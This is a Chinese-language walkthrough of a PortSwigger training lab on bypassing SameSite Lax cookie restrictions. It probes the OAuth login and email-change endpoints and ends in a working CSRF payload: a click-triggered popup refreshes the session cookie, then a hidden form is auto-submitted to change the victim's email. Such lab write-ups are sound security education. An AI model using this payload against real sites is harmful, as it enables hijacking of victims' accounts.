# 实验：通过 Cookie 刷新绕过 SameSite Lax

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

本实验的修改邮箱功能易受 CSRF 攻击。为了解决本实验，请执行一个 CSRF 攻击以修改受害者的邮箱地址。你应该使用提供的漏洞利用服务器（exploit server）来托管你的攻击代码。

本实验支持基于 OAuth 的登录。你可以使用以下凭据通过社交媒体账户登录：`wiener:peter`

> **注意**
> 不同浏览器的默认 SameSite 限制有所不同。由于受害者使用的是 Chrome，我们也建议你使用 Chrome（或 Burp 内置的 Chromium 浏览器）来测试你的利用程序。

> **提示**
> *   你无法注册已被其他用户使用的邮箱地址。如果在测试利用程序时更改了自己的邮箱地址，请确保在向受害者交付最终利用程序时使用另一个不同的邮箱地址。
> *   除非由手动用户交互（例如点击）触发，否则浏览器会阻止弹出窗口打开。受害者用户会点击你发送给他们的任何页面，因此你可以使用全局事件处理程序创建弹出窗口，如下所示：
>
> ```html
> <script>
>     window.onclick = () => {
>         window.open('about:blank')
>     }
> </script>
> ```

## 步骤

探测 oauth
- 探索 oauth 登录流程
    ```http
    GET /social-login HTTP/2
    ```
    - 访问应用程序内的 oauth 登录端点

    ```http
    GET /oauth-callback?code=ySTkoHq4J6knEzgCIBYhS_2H2FvU71LIcBnzZcFTk2o HTTP/2
    ```
    - 使用中间步骤设置的令牌/cookie 访问应用程序内的 oauth 回调端点

    - 响应
        ```http
        Set-Cookie: session=muGvyxvM9o5jy2LxfOVFRvAicL1ntyZs; Expires=Tue, 21 Jul 2026 23:29:17 UTC; Secure; HttpOnly
        ```
        - 未显式设置 cookie 的 samesite 属性，使用默认的 lax

- 尝试触发 cookie 刷新
    - 在登录状态下，访问从用户界面消失的 oauth 端点
        - 此时并不经过一系列中间步骤
            1. 应用程序 oauth 端点
                - 设置参数后客户端重定向到第三方 oauth 端点
            2. 第三方 oauth 端点，使用之前的验证 cookie
                - 设置参数后服务器端重定向到应用程序 oauth 回调端点
            3. 访问应用程序 oauth 回调端点
                - 应用程序设置新 cookie
        - 成功触发会话 cookie 刷新

- 分析
    - 访问应用程序 oauth 端点，将在几个重定向后刷新应用程序 cookie，从而在窗口期内不应用 cookie samesite

探测邮件修改
- 使用邮件修改功能
    ```http
    POST /my-account/change-email HTTP/1.1

    email=a%40b
    ```
    - 无 csrf 令牌

- 尝试转换方法为 GET
    - 失败

- 分析
    - 若触发受害者刷新 cookie，则使用 post 也可携带 cookie


攻击
- 使用 oauth 功能刷新 cookie，使用 post 在窗口期内携带 cookie 访问邮件修改功能端点
    - 构造用于 oauth 验证流程的顶级页面导航的新标签，使用点击触发

        ```html
        <script>
        window.onclick = () => {
            window.open('https://lab-id.web-security-academy.net/social-login');
        }
        </script>
        ```
    - burp csrf poc 构造修改邮件端点表单
    
        ```html
        <html>
        <!-- CSRF PoC - generated by Burp Suite Professional -->
        <body>
            <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="a&#64;b" />
            <input type="submit" value="Submit request" />
            </form>
            <script>
            history.pushState('', '', '/');
            document.forms[0].submit();
            </script>
        </body>
        </html>
        ```
- 最终载荷

    ```html
    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="a&#64;b" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        
        window.onclick = () => {
            window.open('https://lab-id.web-security-academy.net/social-login');

            setTimeout(() => {
                document.forms[0].submit();
            }, 5000);   
        }
        </script>
    </body>
    </html>
    ```
